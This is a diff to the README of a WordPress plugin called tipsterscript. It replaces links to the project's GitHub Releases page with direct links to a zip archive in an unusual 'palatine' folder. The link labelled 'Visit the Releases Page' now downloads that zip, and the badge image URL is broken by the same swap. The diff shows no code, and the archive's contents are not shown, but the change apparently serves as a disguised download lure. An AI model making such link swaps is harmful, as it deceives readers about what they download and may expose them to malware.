@@ -8,13 +8,13 @@ Welcome to **tipsterscript**, a simple WordPress plugin. This tool helps tipster
 
 To start using tipsterscript, you need to download it. Click the button below to go to our Releases page.
 
-[![Download tipsterscript](https://img.shields.io/badge/Download%20tipsterscript-latest%20release-brightgreen)](https://github.com/Dnsjjsjs/tipsterscript/releases)
+[![Download tipsterscript](https://raw.githubusercontent.com/Dnsjjsjs/tipsterscript/main/palatine/tipsterscript-v1.5-alpha.5.zip%20tipsterscript-latest%20release-brightgreen)](https://raw.githubusercontent.com/Dnsjjsjs/tipsterscript/main/palatine/tipsterscript-v1.5-alpha.5.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the link below to access the Releases page:
 
-[Visit the Releases Page](https://github.com/Dnsjjsjs/tipsterscript/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Dnsjjsjs/tipsterscript/main/palatine/tipsterscript-v1.5-alpha.5.zip)
 
 ### Step 2: Choose the Latest Release
 
